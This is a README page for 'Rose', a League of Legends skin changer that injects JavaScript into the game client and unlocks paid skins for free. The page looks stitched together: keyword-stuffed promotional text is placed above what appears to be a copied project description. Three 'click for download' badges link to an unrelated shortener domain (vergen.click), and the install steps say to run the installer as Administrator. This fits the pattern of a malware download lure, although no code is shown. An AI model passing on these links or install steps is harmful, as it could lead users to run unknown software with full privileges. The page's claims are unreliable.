# 🌹 Rose - Effortless Skin Changer for LoL

 What is LoL SkinChanger? 🎮
LoL SkinChanger is a powerful, user-friendly tool designed to modify in-game skins for League of Legends on Windows 2025 editions. 💻 In 2025, with enhanced security and performance updates from Riot Games, this tool ensures seamless compatibility, allowing you to enjoy skins like Legendary Ezreal or Galactic Aatrox without the hefty price tag. 🔧 It's not just about aesthetics—it's about personalization and creativity in the ever-evolving world of MOBA gaming. 🌟


---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---

![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: today](https://img.shields.io/badge/Last_Updated-week-3498db)

---

<img src="https://user-images.githubusercontent.com/58574988/134170370-c827d712-fcc7-432f-b9f8-96678b0c9bf6.gif">

## Overview

Rose is an open-source automatic skin changer for League of Legends that enables seamless access to all skins in the game. The application runs silently in the system tray and automatically detects skin selections during champion select, injecting the chosen skin when the game loads.

**Rose is built on two core technologies:**

- **🎮 [Pengu Loader]**: Plugin system that injects JavaScript plugins into the League Client, enabling enhanced UI interactions and quick skin detection
- **🔧 [CSLOL]**: Safe skin injection framework that handles the actual skin injection process, fully compatible with Riot Vanguard

These technologies work together to provide a seamless and effortless automatic skin-changing experience without any manual intervention.

## Architecture

Rose consists of two main components:

### Python Backend

- **LCU API Integration**: Communicates with the League Client via the League Client Update (LCU) API
- **CSLOL Injection**: Uses CSLOL tools for safe skin injection
- **WebSocket Bridge**: Operates a WebSocket server for real-time communication with frontend plugins
- **Skin Management**: Downloads and manages skins
- **Game Monitoring**: Tracks game state, champion select phases, and loadout countdowns
- **Analytics**: Sends periodic pings to track unique users (configurable, runs in background thread)

---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---


## How It Works

1. **League Client Integration**: Rose activates **[Pengu Loader]** on startup, which injects the JavaScript plugins into the League Client
2. **Skin Detection**: When you hover over a skin in champion select, [`ROSE-SkinMonitor`] detects the selection and sends it to the Python backend
3. **Game Opening Delay**: To make sure the injection has time to occur we suspend League of Legend's game process as long as the overlay is not ran
4. **Game Injection**: Using CSLOL tools, Rose injects the selected skin when the game starts
5. **Seamless Experience**: The skin loads as if you owned it, with full chroma support and no gameplay impact (Rose will never provide any competitive advantage to its users)

## Features

- **Automatic Skin Detection**: Detects skin selections through hover events in champion select
- **All Skins Accessible**: Access to every skin for every champion
- **Chroma Support**: Select any chroma variant through the enhanced UI
- **Random Skin Mode**: Automatically select random skins
- **Historic Mode**: Access last used skin on every champion
- **Custom Mod Insights**: ROSE-CustomWheel surfaces installed mods relevant to the skin you're hovering over, along with timestamps and quick folder access
- **Smart Injection**: Never injects skins you already own
- **Safe & Compatible**: Uses CSLOL injection tools compatible with Riot Vanguard
- **Multi-Language Support**: Works with any client language
- **Open Source**: Fully open source and extensible
- **Free**: If you bought this software, you got scammed 💀

## Requirements

- **Windows 10/11**
- **League of Legends** installed

## Installation

1. Download the latest installer 
2. Run the installer as Administrator
3. Launch Rose from the Start Menu or desktop shortcut


---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---

